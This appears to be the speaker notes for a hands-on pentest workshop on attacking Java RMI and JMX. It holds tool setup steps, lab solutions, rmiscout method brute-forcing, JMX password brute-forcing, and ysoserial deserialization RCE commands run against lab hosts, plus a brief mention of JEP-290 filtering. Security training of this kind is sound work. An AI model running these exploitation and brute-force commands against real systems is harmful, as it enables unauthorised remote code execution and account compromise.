Hi all welcome to the part 2 of Why so Java, today I will talk and present you some common attacks against RMI and JMX technologies.

First things first, I would like you to take a quick quizz while we are waiting 5minutes for others. It is just a quick reminder of the knowledge aquired during previous presentation.

<test time>

Okay we brushed some basics so lets get to work and learn about RMI.

Before that I have just a quick digretion about a tool I came up to recently wchich maybe useful during some specific situations.
https://github.com/bishopfox/gadgetprobe
https://bishopfox.com/blog/gadgetprobe

Basically this tool uses URLDNS gadget to see if certain class exists in java path, this could be chained with gadgetinspector to find some uncommon gadget chains :)

Let's get back to RMI, What is it you may ask ? In a simple words it is a network service, which enables to remotely call java methods. Lets imagine we would like to share an object and its methods so they can be called by different host in the netowork.
Another thing to remember is that RMI uses object serialization during transfering method parameters.

Let's get our hands dirty and let me show you a HelloWorld demo :
<demo 1>

Now let me show this from the pentester's perspective, let's assume we are doing some infrastructure pentest and our nmap has identified RMI server, what can we do with it, how to enumerate it. First nmap-script 

Let me quickly explain the nmap's result, RMI usually uses 2 TCP ports: one sharing the registry and the most common port for that is 1099. However to communicate with the remote object, RMI uses another dynamically allocated (usually high) tcp port.

Let me quickly remind you what is Java interface. I like to think of it as a blueprint for the java method, like class for objects. It specifies what is the type of result (it could be void if it doesn;t need to return anything) and what parameter types are specifically. The implementation of that method can be different in different classes. 

Is it clear ? 

During pentest we can come across objects which implements common known interfaces, which we can find in the internet, but also we can come across some across custom interfaces - if we encounter such case, we can try to bruteforce the methods and parameters and with some luck we may guess it and sucessfully exploit into RCE if there will be a gadgetchain. However I strongly suggest to actually gently ask the developer about this interface. With that exploitation is much, much more simpler.

Another good thing to do would be searching Confluence and Bitbucket, maybe you'll find this interface there.

Now we know the remote object and what interface it implements so let's call some methods. We can actually write some Java code for that or we can use an autonomated tool for that: RMITaste

We can install it from github: https://github.com/STMCyber/RmiTaste

I suggest you do it now:

0. sudo apt install maven
1. git clone https://github.com/STMCyber/RmiTaste
2. cd RmiTaste
3. mkdir libs_attack
4. cd libs_attack
5. wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
6. mv ysoserial-all.jar ysoserial-master-SNAPSHOT.jar
7. cd ../
7. mvn package
8. java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste -h

Now let me show you how to call a method:
java -cp ".:libs_attack:target/rmitaste-1.0-SNAPSHOT-all.jar:/home/fox/Documents/RmiServerExample/target/rmitaste.examples-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste call -t 127.0.0.1 -p 1099 -m "acc2:m0.rmitaste.example.server.ClientAccount:getBalance"

It is time for challenge_1, you need to download the project and run the server, then from the attacker machine try to call the method getFlag() yourself.

solution:

javac RMIInterface.java
jar cvf YourJar.jar *
java -cp ".:libs_attack:target/rmitaste-1.0-SNAPSHOT-all.jar:challenge_1/YourJar.jar" m0.rmitaste.RmiTaste call -t 192.168.233.1 -p 1888 -m "challenge_1:RMIInterface:getFlag"

Next thing -> bruteforsing methods with rmiscout

challenge_2

https://github.com/BishopFox/rmiscout/releases/tag/v1.4

sudo update-alternatives --config java

java -jar rmiscout-1.4-SNAPSHOT-all.jar wordlist -i lists/prototypes.txt 192.168.233.1 1888

java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar:custom_interfaces/challenge_2/YourJar.jar" m0.rmitaste.RmiTaste call -t 192.168.233.1 -p 1888 -m "challenge_2:RMIInterface:getNamespace" -mp "string=1234"
cat logfile.txt

-=-=-=-=-=-=-=-
1 more thing, sometimes registry will try to redirect rmi communication to localhost (127.0.0.1), but from the attacker's perspective it will be his localhost where he doesn't have any RMI instead of server's localhost. In that case we just need to do some port forwarding, you may use this socat command to do this: `sudo socat TCP-LISTEN:50651,fork TCP:192.168.233.1:50651`

Now we know how to call methods or bruteforse them, let's pop some RCE. If we remember correctly server uses serialization for the parameters for remote method calling. This means we can abuse it if we find gadgetchain.

lab3 solution: java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar:lab3/rce.jar" m0.rmitaste.RmiTaste attack -t 192.168.233.1 -p 1888 -m "lab3:RMIInterface:exploit" -gen bruteforce -c "C:\Windows\System32\calc.exe"

The most simple case would be if we find the method which has an Object as parameter, but there are sweet tricks for primary parameters as well.

java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar:lab4/rce.jar" m0.rmitaste.RmiTaste enum -t 192.168.233.1 -p 1888

java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar:lab4/rce.jar" m0.rmitaste.RmiTaste attack -t 192.168.233.1 -p 1888 -m "lab3:RMIInterface:exploit3" -g "CommonsCollections6" -c "C:\Windows\System32\calc.exe"

java -jar rmiscout-1.4-SNAPSHOT-all.jar exploit -s 'String exploit3(int[] i)' -p ysoserial.payloads.CommonsCollections6 -c "C:\Windows\System32\calc.exe" -n lab3 192.168.233.1 1888

Next thing is JMX:
The main thing what you need to know is that JMX enables devs to monitor and manave JavaVirtualMachine JVM.

It utilizes something called an MBean ehich is a managed Java object, similar to a JavaBeans component, that follows the design patterns set forth in the JMX specification. An MBean can represent a device, an application, or any resource that needs to be managed.

In JMX Connection with MBean can be done with different protocols RMI/JMX Messaging Protocol or even HTTP.

let me show you JMX:

ssl / password

password bruteforcing: java -jar jmxbf.jar -h 127.0.0.1 -p 1617 -pf passwords.txt -uf users.txt

Now let me show you the exploit

Patch JEP-290 introduced in 2016 enables filtering incoming serialized objects

Fillters can be configured via:
• parameter jdk.serialFilter;
• parameter jdk.serialFilter in file conf/security/java.properties.







